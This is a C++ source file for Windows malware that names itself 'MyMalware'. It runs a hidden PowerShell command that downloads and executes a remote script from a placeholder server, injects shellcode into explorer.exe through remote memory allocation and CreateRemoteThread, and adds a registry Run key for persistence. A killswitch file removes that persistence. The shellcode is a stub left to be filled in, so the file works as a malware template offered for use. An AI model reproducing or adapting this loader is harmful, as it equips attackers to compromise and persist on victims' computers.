#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <fstream>

using namespace std;

// Path for killswitch
const wchar_t* KILLSWITCH_PATH = L"C:\\temp\\killswitch.txt";

// Function to check for the killswitch file
bool checkKillswitch() {
    ifstream killswitchFile(KILLSWITCH_PATH);
    return killswitchFile.good(); // Returns true if file exists
}

// Remove registry persistence if killswitch is triggered
void removeRegistryPersistence() {
    HKEY hKey;
    const wchar_t* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, L"MyMalware"); // Remove persistence entry
        RegCloseKey(hKey);
        wcout << L"Persistence removed from registry." << endl;
    } else {
        wcout << L"Failed to remove registry key." << endl;
    }
}

void runPowershellScript() {
    const wchar_t* psScript = L"powershell -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://your-server/payload.ps1')\"";

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcess(NULL, (LPWSTR)psScript, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        wcout << L"Failed to execute PowerShell script." << endl;
    }
}

DWORD findProcessID(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        wcout << L"Failed to create process snapshot." << endl;
        return 0;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snap, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

void injectIntoProcess(DWORD pid, const char* payload) {
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process) {
        wcout << L"Failed to open target process." << endl;
        return;
    }

    void* allocMem = VirtualAllocEx(process, NULL, strlen(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocMem) {
        wcout << L"Failed to allocate memory in target process." << endl;
        CloseHandle(process);
        return;
    }

    if (!WriteProcessMemory(process, allocMem, payload, strlen(payload), NULL)) {
        wcout << L"Failed to write payload to target process." << endl;
        VirtualFreeEx(process, allocMem, 0, MEM_RELEASE);
        CloseHandle(process);
        return;
    }

    HANDLE remoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);
    if (remoteThread) {
        CloseHandle(remoteThread);
        wcout << L"Injected payload into target process." << endl;
    } else {
        wcout << L"Failed to create remote thread." << endl;
    }

    CloseHandle(process);
}

void setRegistryPersistence(const wchar_t* executablePath) {
    HKEY hKey;
    const wchar_t* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"MyMalware", 0, REG_SZ, (const BYTE*)executablePath, (wcslen(executablePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        wcout << L"Persistence set in registry." << endl;
    } else {
        wcout << L"Failed to set registry key." << endl;
    }
}

int main() {
    // Check if the killswitch is active
    if (checkKillswitch()) {
        wcout << L"Killswitch activated. Disabling malware and exiting." << endl;
        removeRegistryPersistence(); // Clean up persistence if killswitch is triggered
        return 0; // Exit without executing any further code
    }

    // Step 1: Execute PowerShell Script from Memory
    runPowershellScript();

    // Step 2: Inject into a Legitimate Process (e.g., "explorer.exe")
    DWORD pid = findProcessID(L"explorer.exe");
    const char* payload = "\x90\x90\x90"; // Replace with actual shellcode 
    if (pid) {
        injectIntoProcess(pid, payload);
    } else {
        wcout << L"Target process not found." << endl;
    }

    // Step 3: Set Persistence in Registry
    setRegistryPersistence(L"C:\\path\\to\\your\\malware.exe");

    return 0;
}
